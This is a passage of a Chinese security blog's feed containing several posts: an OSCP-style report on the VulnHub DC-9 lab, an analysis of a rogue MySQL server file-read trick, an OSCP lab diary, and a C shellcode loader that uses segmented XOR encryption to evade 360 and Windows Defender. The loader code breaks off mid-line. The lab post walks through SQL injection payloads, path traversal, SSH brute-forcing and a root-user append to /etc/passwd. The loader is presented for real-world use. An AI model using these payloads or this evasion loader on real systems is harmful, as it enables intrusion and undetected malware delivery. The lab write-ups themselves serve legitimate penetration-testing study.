&lt;br&gt;

&lt;p&gt;由于 Report 中只有第三节是重点，所以本节就直接仿照第三节来写了。&lt;/p&gt;</summary>
    
    
    
    <category term="OSCP" scheme="http://example.com/categories/OSCP/"/>
    
    
    <category term="OSCP" scheme="http://example.com/tags/OSCP/"/>
    
  </entry>
  
  <entry>
    <title>OSCP report 练手之 - vulnhub DC-9</title>
    <link href="http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/"/>
    <id>http://example.com/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/</id>
    <published>2021-02-11T03:01:38.000Z</published>
    <updated>2021-02-28T12:05:56.769Z</updated>
    
    <content type="html"><![CDATA[<p>临近  OSCP Exam了，做点 Vulnhub 的靶机练练手，顺便也练练 Report 的编写。</p><br><p>靶机地址：</p><p><a href="https://www.vulnhub.com/entry/dc-9,412/">https://www.vulnhub.com/entry/dc-9,412/</a></p><br><p> <strong>stuck:</strong></p><p>1、拿到 LFI 之后，尝试包含 /proc/self/fd getshell 无果。然后就翻了翻攻略。发现了 Linux knockd 这种东西</p><p>2、做题的时候没有爆所有的数据库，只爆了当前库，导致 ssh brute 的时候跑了一万年都没跑出来 = =。翻攻略才发现账号密码在另一个数据库里。</p><br><p>OSCP Exam Report 的模板在此：</p><p><a href="https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf">https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf</a></p><br><p>由于 Report 中只有第三节是重点，所以本节就直接仿照第三节来写了。</p><span id="more"></span><br><h2 id="3-2-Report-–-Service-Enumeration"><a href="#3-2-Report-–-Service-Enumeration" class="headerlink" title="3.2 Report – Service Enumeration"></a>3.2 Report – Service Enumeration</h2><table><thead><tr><th>Server IP Address</th><th>Ports Open</th><th>Service / Banner</th></tr></thead><tbody><tr><td>192.168.92.167</td><td>22, 80</td><td>ssh / Apache</td></tr></tbody></table><br><h2 id="3-3-Report-–-Penetration"><a href="#3-3-Report-–-Penetration" class="headerlink" title="3.3 Report – Penetration"></a>3.3 Report – Penetration</h2><p><strong>Vulnerability Exploited:</strong>  <strong><span style="color:blue">SQL Inject and LFI</span></strong></p><p><strong>System Vulnerable:</strong> 192.168.92.167</p><p><strong>Vulnerability Explanation:</strong> There are one sql inject and a local file inclusion(LFI) vulnerability in this web application. A combination of these vulnerabilities was used to obtain a low privilege shell.</p><p><strong>Privilege Escalation Vulnerability:</strong> Abuse sudo permission</p><p><strong>Vulnerability Fix:</strong> sql syntax filter</p><p><strong>Severity:</strong> <strong><span style="color:red">Critical</span></strong></p><br><p><strong>Information Gathering:</strong></p><br><p>kali@kali:~/Desktop$ <strong><span style="color:blue">sudo nmap -sV -A 192.168.92.167 -n</span></strong></p><p>……</p><p>PORT  STATE  SERVICE VERSION</p><p><strong><span style="color:red">22/tcp filtered ssh</span></strong></p><p><strong><span style="color:red">80/tcp open   http  Apache httpd 2.4.38 ((Debian))</span></strong></p><p>…..</p><br><p><strong>Find a  SQL inject in the port 80 website.url is:</strong></p><p><strong><span style="color:blue"><a href="http://192.168.92.167/results.php">http://192.168.92.167/results.php</a></span></strong></p><br><p><strong>Testing payload:</strong></p><p>‘ or 1=1 #</p><img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/1.png" style="width:800px"><br><p><strong>Get the current database type:</strong></p><p>‘ union select 1,2,3,4,5,(select version()) #</p><img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/2.png" style="width:800px"><br><p><strong>Enum all databases</strong>:</p><p>‘ union select 1,2,3,4,5,(select <span style="color:red">schema_name</span> from information_schema.schemata limit 0,1) #</p><img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/3.png" style="width:800px"><br><p><strong>Change the “limit” value and resend. Get <span style="color:red">three</span> database schemases:</strong></p><p>information_schema</p><p>Staff</p><p>users</p><br><p><strong>Check current used database:</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/4.png" style="width:800px"><br><p><strong>Get all tables of current used database:</strong></p><p>‘ union select 1,2,3,4,5,(select <span style="color:red">table_name</span> from information_schema.tables where <span style="color:red">table_schema=database()</span> limit 0,1) #</p><img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/5.png" style="width:800px"><br><p><strong>Change the “limit” value and resend. Get <span style="color:red">two</span> tables:</strong></p><p>StaffDetails</p><p>Users</p><br><p><strong>Get all columns in table “Users”</strong></p><p>‘ union select 1,2,3,4,5,(select <span style="color:red">column_name</span> from information_schema.columns where table_schema=database() and table_name=’<span style="color:red">Users</span>‘ limit 0,1) #</p><br><p><strong>Change the “limit” value and resend. Get <span style="color:red">three</span> tables:</strong></p><p>UserID</p><p>Username</p><p>Password</p><br><p><strong>By above information,We can get the username and password directly by sql inject:</strong></p><p><strong>Payload:</strong></p><p>‘ union select 1,2,3,4,5,(select <span style="color:red">username</span> from Users limit 0,1) #</p><p>‘ union select 1,2,3,4,5,(select <span style="color:red">password</span> from Users limit 0,1) #</p><br><p><strong>Get the following information:</strong></p><table><thead><tr><th>Username</th><th>Password</th></tr></thead><tbody><tr><td>admin</td><td>856f5de590ef37314e7c3bdf6f8a66dc</td></tr></tbody></table><br><p><strong>go to the website <a href="https://www.somd5.com/">https://www.somd5.com/</a> and successful crack the md5 hash,Plaintext is <span style="color:red">transorbital1</span> :</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/6.png" style="width:800px"><br><p><strong>Now we should enum the tables of database “users”. The steps are like the above steps,so I just only the payload here</strong> </p><br><p><strong>payload to get all tables of database “users”</strong></p><p>‘ union select 1,2,3,4,5,(select <span style="color:red">table_name</span> from information_schema.tables where table_schema=’<span style="color:red">users</span>‘ limit 0,1) #</p><br><p><strong>Get <span style="color:red">one</span> tables:</strong></p><p>UserDetails</p><br><p><strong>payload to get all columns of table “UserDetails”, database “users”</strong></p><p>‘ union select 1,2,3,4,5,(select <span style="color:red">column_name</span> from information_schema.columns where <span style="color:red">table_name=’UserDetails’ and table_schema=’users’</span> limit 0,1) #</p><br><p><strong>Get <span style="color:red">six</span> columns:</strong></p><p>id</p><p>firstname</p><p>lastname</p><p>username</p><p>password</p><p>reg_date</p><br><p><strong>Find an intersting column “password”.Go to “Brup intruder” to fetch all  username and password in table”UserDetails” database “users”</strong></p><p><strong>Payload:</strong></p><p>‘ union select 1,2,3,4,5,(select <span style="color:red">password</span> from users.UserDetails limit §0§,1) #</p><p>‘ union select 1,2,3,4,5,(select <span style="color:red">username</span> from users.UserDetails limit §0§,1) #</p><img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/7.png" style="width:800px"><img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/8.png" style="width:800px"><br><p><strong>Get following username and password:</strong></p><p>marym:3kfs86sfd</p><p>julied:468sfdfsd2</p><p>fredf:4sfd87sfd1</p><p>barneyr:RocksOff</p><p>tomc:TC&amp;TheBoyz</p><p>jerrym:B8m#48sd</p><p>wilmaf:Pebbles</p><p>bettyr:BamBam01</p><p>chandlerb:UrAG0D!</p><p>joeyt:Passw0rd</p><p>rachelg:yN72#dsd</p><p>rossg:ILoveRachel</p><p>monicag:3248dsds7s</p><p>phoebeb:smellycats</p><p>scoots:YR3BVxxxw87</p><p>janitor:Ilovepeepee</p><p>janitor2:Hawaii-Five-0</p><br><p><strong>Sql inejct finished.Now we logging in target website as user “admin” password “transorbital1”</strong></p><p><strong>Note the line “File does not exits”</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/9.png" style="width:800px"><br><p><strong>Try to use following payload:</strong></p><p><a href="http://192.168.92.167/manage.php?file=../../../../../etc/passwd">http://192.168.92.167/manage.php?file=../../../../../etc/passwd</a></p><img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/10.png" style="width:800px"><br><p><strong>Brute linux local file:</strong></p><p>wfuzz -u <a href="http://192.168.92.167/manage.php?file=../../../../..FUZZ">http://192.168.92.167/manage.php?file=../../../../..FUZZ</a> -w Linux_File.txt -b <span style="color:red">“PHPSESSID=an0drpvpbm4gv0e70s99nj5evc”</span> –hh 1341</p><img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/11.png" style="width:800px"><br><p><strong>Find an intersting file “knockd.conf”</strong></p><p><strong>We need request port 7469, port 8475, port 9842 then ssh will be opened.</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/12.png" style="width:800px"><br><p><strong>knockd those ports:</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/13.png" style="width:800px"><br><p><strong>ssh is opened now. Use hydra to brute ssh.username and password dict is the username and password that be got in table “UserDetails”, database “users”</strong></p><p>hydra -C userpass.txt ssh://192.168.92.167 -t 4 -vV</p><img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/14.png" style="width:800px"><br><p><strong>Get three users and passwords:</strong></p><p>login: chandlerb  password: UrAG0D!</p><p>login: joeyt  password: Passw0rd</p><p>login: janitor  password: Ilovepeepee</p><br><p><strong>ssh logging in the target as user “janitor”. Find an intersting file in <span style="color:blue">/home/janitor/.secrets-for-putin/passwords-found-on-post-it-notes.txt</span></strong></p><img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/15.png" style="width:800px"><br><p><strong>seems like password for the ohter user.</strong></p><p><strong>Let’s turn to hydra again and brute ssh. password dict is the password in file <span style="color:blue">/home/janitor/.secrets-for-putin/passwords-found-on-post-it-notes.txt</span></strong></p><p>hydra -L user.txt -P pass.txt ssh://192.168.92.167 -t 4</p><img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/16.png" style="width:800px"><br><p><strong>Get one user and password:</strong></p><p>fredf:B4-Tru3-001</p><br><p><strong>ssh logging in the target as user “fredf”. Eunmeration for sudo Permissions.</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/17.png" style="width:500px"><br><p><strong>Try to run this executable file.</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/18.png" style="width:500px"><br><p><strong>Testing the feature “append” of this executable file</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/19.png" style="width:500px"><br><p><strong>Try to append a new line to  /etc/passwd</strong></p><p>fredf@dc-9:~/app$<span style="color:blue"> echo ‘panpan:zZoY87S9mdtnk:0:0:root:/root:/bin/bash’ &gt; 6.txt</span></p><p>fredf@dc-9:~/app$ <span style="color:blue">sudo /opt/devstuff/dist/test/test 6.txt /etc/passwd</span></p><br><p><strong>cat /etc/passwd</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/20.png" style="width:500px"><br><p><strong>su panpan</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/21.png" style="width:500px"><br><p><strong>Proof file:</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-dc-9-oscp/22.png" style="width:800px">]]></content>
    
    
    <summary type="html">&lt;p&gt;临近  OSCP Exam了，做点 Vulnhub 的靶机练练手，顺便也练练 Report 的编写。&lt;/p&gt;
&lt;br&gt;

&lt;p&gt;靶机地址：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.vulnhub.com/entry/dc-9,412/&quot;&gt;https://www.vulnhub.com/entry/dc-9,412/&lt;/a&gt;&lt;/p&gt;
&lt;br&gt;

&lt;p&gt; &lt;strong&gt;stuck:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、拿到 LFI 之后，尝试包含 /proc/self/fd getshell 无果。然后就翻了翻攻略。发现了 Linux knockd 这种东西&lt;/p&gt;
&lt;p&gt;2、做题的时候没有爆所有的数据库，只爆了当前库，导致 ssh brute 的时候跑了一万年都没跑出来 = =。翻攻略才发现账号密码在另一个数据库里。&lt;/p&gt;
&lt;br&gt;

&lt;p&gt;OSCP Exam Report 的模板在此：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf&quot;&gt;https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf&lt;/a&gt;&lt;/p&gt;
&lt;br&gt;

&lt;p&gt;由于 Report 中只有第三节是重点，所以本节就直接仿照第三节来写了。&lt;/p&gt;</summary>
    
    
    
    <category term="OSCP" scheme="http://example.com/categories/OSCP/"/>
    
    
    <category term="OSCP" scheme="http://example.com/tags/OSCP/"/>
    
  </entry>
  
  <entry>
    <title>Rogue Mysql Server 简单分析</title>
    <link href="http://example.com/2021/02/08/2021-02-08-mysql-load-data/"/>
    <id>http://example.com/2021/02/08/2021-02-08-mysql-load-data/</id>
    <published>2021-02-08T09:51:08.000Z</published>
    <updated>2021-04-23T05:58:20.983Z</updated>
    
    <content type="html"><![CDATA[<p>首先起环境。我这里使用的是 mysql5.7。</p><p>mysql在本地连接默认使用的是本地 sock，不方便抓包，需要手动指定 -h 127.0.0.1。</p><p>并且 mysql 默认使用了 ssl。抓包不方便看，所以 客户端连接的时候 采用 –ssl=0 的方式强制让 mysql 不使用 ssl</p><p>客户端连接 mysql：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 127.0.0.1 -u root -p123456  --ssl&#x3D;0</span><br></pre></td></tr></table></figure><br><span id="more"></span><h1 id="分析-Mysql-流程"><a href="#分析-Mysql-流程" class="headerlink" title="分析 Mysql 流程"></a>分析 Mysql 流程</h1><p>配置好后，Wireshark抓包时就可以看到明文传输的数据了：</p><br><img src="/2021/02/08/2021-02-08-mysql-load-data/1.png" style="width:500px;"><br><p>LOAD DATA LOCAL INFILE 的作用是将客户端本地的文件导入到 mysql 数据库中，简单用法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data local infile &quot;&#x2F;PATH&#x2F;XX.sql&quot; into table TABLE_NAME</span><br></pre></td></tr></table></figure><br><p>这条语句中 /PATH/XX.sql 为读取导入的文件。而 TABLE_NAME 为导入到哪张表中。</p><br><p>为了测试正常 mysql 服务如何处理 LOAD DATA LOCAL INFILE，我们先在 Mysql中创建一个库和一张表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">create database tmp;</span><br><span class="line"></span><br><span class="line">use tmp;</span><br><span class="line"></span><br><span class="line">create table t(</span><br><span class="line"></span><br><span class="line">content text</span><br><span class="line"></span><br><span class="line">);</span><br></pre></td></tr></table></figure><br><p>开启抓包并输入SQL语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data local infile &quot;&#x2F;tmp&#x2F;1.txt&quot; into table tmp.t;</span><br></pre></td></tr></table></figure><br><img src="/2021/02/08/2021-02-08-mysql-load-data/2.png" style="width:500px;"><br><p><span style="color:red">其中红色字体为 客户端请求</span>，<span style="color:blue">蓝色字体为 服务端响应。</span></p><br><p><strong>从这里可以得知 Mysql LOAD DATA LOCAL INFILE 的大致流程：</strong></p><p>1、客户端向服务端发送SQL语句，表示需要 LOAD DATA LOCAL INFILE。</p><p>2、服务端返回要读取的本地文件路径</p><p>3、客户端读取本地文件将内容返回至服务端</p><br><p>而恶意Mysql服务器读取本地文件的原理是，这里第二步骤是可以伪造的。也就是说 Mysql 服务端发送了第二步骤的<strong>响应</strong>，Mysql客户端就会乖乖的把自己的本地文件读取上交。</p><br><h1 id="Rogue-Mysql-Server"><a href="#Rogue-Mysql-Server" class="headerlink" title="Rogue Mysql Server"></a>Rogue Mysql Server</h1><p>恶意Mysql服务器的项目在 github 中有：<a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p><p>clone 下来后，修改下主文件 <code>rogue_mysql_server.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PORT = <span class="number">3307</span>   <span class="comment">#端口号</span></span><br><span class="line"></span><br><span class="line">filelist = (</span><br><span class="line">    <span class="string">&#x27;/tmp/1.txt&#x27;</span>,  <span class="comment">#读取文件路径</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>注意 <code>rogue_mysql_server</code> 是使用 <strong>python2.7</strong> 运行的。</p><br><p>直接 <code>python rogue_mysql_server.py</code> 即可运行</p><br><p>使用 mysql 客户端连接并抓包，对比正常的 LOAD DATA</p><img src="/2021/02/08/2021-02-08-mysql-load-data/3.png" style="width:500px;"><p>红框之前的都是登陆包。在 红框中可以看到：虽然客户端发出的请求是 select version。但是服务端却响应了 ”读取本地文件“ 的指令，于是客户端便读取本地文件并上传内容。</p><br><p>这里值得注意的是 ，Mysql 客户端需要发送一次 QUERY 请求，方可读取文件。不知是 Mysql 机制如此还是什么，之后可以瞄一瞄。</p><br><p>Mysqli Client 登陆时自动会发送 select version 请求，但是使用 PHP 连接 Rogue Mysql server 就需要注意了，需要手动添加一个 QUERY 操作：</p><img src="/2021/02/08/2021-02-08-mysql-load-data/4.png" style="width:500px;">]]></content>
    
    
    <summary type="html">&lt;p&gt;首先起环境。我这里使用的是 mysql5.7。&lt;/p&gt;
&lt;p&gt;mysql在本地连接默认使用的是本地 sock，不方便抓包，需要手动指定 -h 127.0.0.1。&lt;/p&gt;
&lt;p&gt;并且 mysql 默认使用了 ssl。抓包不方便看，所以 客户端连接的时候 采用 –ssl=0 的方式强制让 mysql 不使用 ssl&lt;/p&gt;
&lt;p&gt;客户端连接 mysql：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mysql -h 127.0.0.1 -u root -p123456  --ssl&amp;#x3D;0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;br&gt;</summary>
    
    
    
    <category term="Mysql" scheme="http://example.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="http://example.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>OSCP Lab Journey</title>
    <link href="http://example.com/2021/01/05/oscp-journey/"/>
    <id>http://example.com/2021/01/05/oscp-journey/</id>
    <published>2021-01-05T07:49:09.000Z</published>
    <updated>2021-03-06T06:29:07.492Z</updated>
    
    <content type="html"><![CDATA[<p>简单记录下60天的 OSCP lab 旅途</p><span id="more"></span><br><p>2020.12.6 - 2020.12.13【第一周】</p><p>由于之前有过基础，就边看 官方的课程边打靶机。第一周打下了 8台 （有三天玩免杀去了没做题。。不然应该能再打下4台）</p><p>打下的靶机名字：</p><p>phoenix</p><p>mike</p><p>bob</p><p>pain</p><p>leftturn</p><p>fc4</p><p>break</p><p>susie</p><p>第二周目标：总共打下 20 台 靶机</p><br><p>===============================</p><p>2020.12.14 - 2020.12.20【第二周】</p><p>本周只打下了10台靶机 = =。并没有完成 20台靶机的目标。最大的原因是其中一台靶机由于不够耐心，没有枚举数据库，导致卡壳了三天。。。 现在不应该追求打下的靶机数，应该追求质量，囫囵吞枣可不好。</p><p>joe</p><p>alpha</p><p>mailman</p><p>gamma</p><p>disco</p><p>ralph</p><p>alice</p><p>chris</p><p>mail</p><p>[peter] – need a friend</p><br><p>===============================</p><p>2020.12.21 - 2020.12.27【第三周】</p><p>7台。学习了下域渗透</p><p>[pedro] – need a friend</p><p>SV-DC01 – domain</p><p>SV-FILE01 – domain</p><p>SVCLIENT08 – domain</p><p>SVCLIENT73 – domain</p><p>jd</p><p>beta</p><br><p>===============================</p><p>2020.12.28 - 2020.1.3【第四周】</p><p>元旦。。。摸鱼去了。。。</p><p>只打了4台</p><p>单单一个humble 就干了3天。。提权卡住了</p><p>timeclock</p><p>jeff</p><p>humble</p><p>core</p><br><p>===============================</p><p>2021.1.4 - 2021.1.10【第五周】</p><p>传说中最难的三大护法：pain、sufferance、humble 已经淦完了。感觉还好，感谢前辈们的文章参考</p><p>开始军训了。。时间少了好多。。。</p><p>7台靶机</p><p>hotline</p><p>dj</p><p>gh0st</p><p>sufferance</p><p>sean</p><p>dotty</p><p>tophat</p><br><p>===============================</p><p>2021.1.11 - 2021.1.17【第六周】</p><p>3台</p><p>kraken</p><p>bruce</p><p>tophat.acme.com</p><br><p>===============================</p><p>2021.1.18 - 2021.1.24【第六周】</p><p>5台</p><p>1nsider</p><p>XOR-DC01 – domain</p><p>XOR-APP23 – domain</p><p>XOR-APP07 – domain</p><p>XOR-APP59 – domain</p><br><p>===============================</p><p>2021.1.25 - 2021.1.31【第六周】</p><p>2台</p><p>一来放假回到家便懒惰了（主要原因）。。。二来确实打不动了，DEV的 network key 怎么提交都不对。。。有点神奇</p><p>master</p><p>Bethany</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;简单记录下60天的 OSCP lab 旅途&lt;/p&gt;</summary>
    
    
    
    <category term="OSCP" scheme="http://example.com/categories/OSCP/"/>
    
    
    <category term="OSCP" scheme="http://example.com/tags/OSCP/"/>
    
  </entry>
  
  <entry>
    <title>分段加密shellcode</title>
    <link href="http://example.com/2020/12/15/segmentation-shellcode/"/>
    <id>http://example.com/2020/12/15/segmentation-shellcode/</id>
    <published>2020-12-15T07:38:23.000Z</published>
    <updated>2020-12-30T15:06:46.075Z</updated>
    
    <content type="html"><![CDATA[<p>说个题外话。。。</p><p>测试的时候发现，360放在虚拟机里哪怕给他连上了网。。。简单用异或加密下的 shellcode 能正常上线，最主要的是。。跑mimikatz 360居然动都不动</p><p>但是一旦放到物理机上，刚下下来 马子 就马上被杀。</p><p>这就有点奇葩。。。盲猜360检测了虚拟机环境。。。</p><p>这个分段加密的shellcode 测试了下，实体机上能过 360、defender 上线</p><span id="more"></span><br><p>现在的杀软对于普通的一次异或加密shellcode 都基本能静态秒杀。于是乎产生了一些想法：</p><p><code>shellcode</code> 在 <code>loader</code> 里是经过 <code>异或加密</code> 的。难道说杀软遍历 1 - 255 去依次 <code>异或解密</code> 吗？有点不现实</p><p>那既然直接爆破破解 异或值 不太现实，那杀软凭什么能静态秒杀呢？沙盒吗？</p><p>结果测试的时候发现，单单在 <code>loader</code> 中放一个 一次异或加密的 <code>shellcode</code> 也会被杀</p><p>那就很明显了，一次异或加密的 <code>shellcode</code> 也许还有一些特征值，有规律，被杀软检测到了</p><p>那我们将 shellcode 分段加密，<strong>把规律打破</strong>，是不是自然就能过杀软了呢？</p><br><p>下面上代码：</p><p>首先需要在本地把 shellcode 加密下。。自动加密的脚本。。之后有空再写吧哈哈</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//未加密 shellcode 版。自己调试然后拿加密后的 shellcode 以及 xorData</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">/* length: 926 bytes */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> source_shellcode[] = <span class="string">&quot;SHELLCODE&quot;</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> encode_shellcode[<span class="number">926</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//XOR分段数,固定长度 926 / 2 = 463</span></span><br><span class="line"><span class="keyword">int</span> xorNum = <span class="number">463</span>;</span><br><span class="line"><span class="comment">//保存每次分段 XOR 的值</span></span><br><span class="line"><span class="keyword">int</span> xorData[<span class="number">463</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> source_shellcode_length = <span class="keyword">sizeof</span>(source_shellcode);</span><br><span class="line"><span class="keyword">char</span> decode;</span><br><span class="line"><span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//分段XOR</span></span><br><span class="line">srand((<span class="keyword">unsigned</span> <span class="keyword">int</span>)time(<span class="literal">NULL</span>));</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; xorNum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 不能太大，也不能是 0</span></span><br><span class="line">xorData[i] = rand() % <span class="number">200</span> + <span class="number">10</span>;</span><br><span class="line"><span class="comment">//每2个一分组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++) &#123;</span><br><span class="line">encode_shellcode[k] = source_shellcode[k] ^ xorData[i];</span><br><span class="line">k++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>记得改下shellcode长度</p><img src="/2020/12/15/segmentation-shellcode/1.png" style="width:500px;"><p>打个断点，用调试器拿加密过的 <code>shellcode</code> 和 <code>xordata</code>:</p><p>记得勾下 <strong>十六进制显示</strong>，将之复制出来</p><img src="/2020/12/15/segmentation-shellcode/2.png" style="width:500px;"><p>复制出来后到 sublime 中进行修改（sublime真好用）</p><img src="/2020/12/15/segmentation-shellcode/3.png" style="width:500px;"><p>别忘了还有个 <code>Xordata</code></p><img src="/2020/12/15/segmentation-shellcode/4.png" style="width:500px;"><p>获取到 加密的 <code>shellcode</code> 和 <code>Xordata</code> 之后，将其放入到下面代码 中</p><p><i>ps：这些变量这么命名的话，如果杀软会检测<code>符号表</code>就有可能会 gg，实战的时候最好改下变量名</i></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">/* length: 926 bytes */</span></span><br><span class="line"><span class="comment">//没做那么智能化，加密的shellcode 和 XORdata 就在上一个代码中自己用调试器调然后拷贝出来把</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> encode_shellcode[<span class="number">926</span>] = <span class="string">&quot;SHELLCODE&quot;</span>;</span><br><span class="line"><span class="comment">//XOR分段数,固定长度 926 / 2 = 463</span></span><br><span class="line"><span class="keyword">int</span> xorNum = <span class="number">463</span>;</span><br><span class="line"><span class="comment">//保存每次分段 XOR 的值</span></span><br><span class="line"><span class="keyword">int</span> xorData[<span class="number">463</span>] = &#123; <span class="number">0</span>xXX,<span class="number">0</span>xXX,<span class="number">0</span>xXX…… &#125;;</span><br><span class="line"><span class="keyword">char</span> decode;</span><br><span class="line"><span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>* Memory;</span><br><span class="line"><span class="comment">//故意开内存只开1，实际上后面偏移的时候还是能插进去的，可能能过下杀软</span></span><br><span class="line">Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="number">1</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">926</span>; i++) &#123;</span><br><span class="line">Memory[i] = encode_shellcode[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//XOR分段解码。直接在内存中异或，防止 shellcode 泄露。也许能过下杀软吧</span></span><br><span class="line"><span class="comment">//每两个一分组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; xorNum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++) &#123;</span><br><span class="line">decode = encode_shellcode[k] ^ xorData[i];</span><br><span class="line">Memory[k] = 